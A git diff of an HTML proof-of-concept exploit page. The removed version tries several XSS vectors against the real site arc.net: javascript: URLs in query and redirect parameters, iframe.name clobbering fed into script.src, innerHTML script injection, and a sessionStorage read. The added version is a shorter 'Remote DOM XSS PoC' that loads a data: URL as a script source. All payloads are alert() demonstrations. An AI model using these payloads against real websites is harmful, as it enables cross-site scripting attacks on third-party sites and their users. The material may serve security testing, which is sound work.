@@ -1,64 +1,14 @@
+<!-- hosted على github أو أي صفحة خارجية -->
 <!DOCTYPE html>
 <html>
-<head>
-  <title>PoC | External Exploit for arc.net</title>
-</head>
+<head><title>Remote DOM XSS PoC</title></head>
 <body>
-  <h1>🚨 External Exploit Test for arc.net</h1>
-
-  <!-- 1. XSS via href injection -->
-  <h2>1️⃣ XSS via <a href="javascript:..."> injection</h2>
-  <iframe id="xss-href" src="https://arc.net/?e=javascript:alert('XSS_href')" 
-          width="100%" height="120" style="border:2px solid red;"></iframe>
-
-  <!-- 2. DOM Clobbering with iframe.name -->
-  <h2>2️⃣ iframe.name → script.src injection</h2>
-  <iframe id="clobber" name="data:text/javascript,alert('XSS_from_iframe.name')"></iframe>
+  <iframe id="src" name="src" src="data:text/javascript,alert('Remote DOM XSS!')" style="display:none"></iframe>
   <script>
-    setTimeout(() => {
-      try {
-        const s = document.createElement("script");
-        s.src = frames['clobber'].name;
-        document.body.appendChild(s);
-        console.log("✅ iframe.name used as script.src");
-      } catch (err) {
-        console.error("❌ iframe.name injection failed", err);
-      }
-    }, 1500);
-  </script>
-
-  <!-- 3. innerHTML script injection -->
-  <h2>3️⃣ Script injection via innerHTML</h2>
-  <script>
-    setTimeout(() => {
-      try {
-        const sc = document.createElement("script");
-        sc.innerHTML = "alert('XSS_from_innerHTML_script')";
-        document.head.appendChild(sc);
-      } catch (err) {
-        console.error("❌ innerHTML injection failed", err);
-      }
-    }, 3000);
-  </script>
-
-  <!-- 4. Redirection manipulation (href from location.href) -->
-  <h2>4️⃣ Redirect / URL injection</h2>
-  <iframe src="https://arc.net/?redirect=javascript:alert('XSS_redirect')" 
-          width="100%" height="120" style="border:2px solid orange;"></iframe>
-
-  <!-- 5. Simulate reading sessionStorage (if site vulnerable to XSS) -->
-  <h2>5️⃣ Simulate sessionStorage data leak</h2>
-  <script>
-    setTimeout(() => {
-      try {
-        const s = sessionStorage.getItem("scrollState");
-        if (s) {
-          alert("SessionStorage leak: " + s);
-        }
-      } catch (e) {
-        console.log("No access to sessionStorage");
-      }
-    }, 5000);
+    window.src = document.getElementById('src');
+    let s = document.createElement('script');
+    s.src = src.src;
+    document.body.appendChild(s);
   </script>
 </body>
 </html>
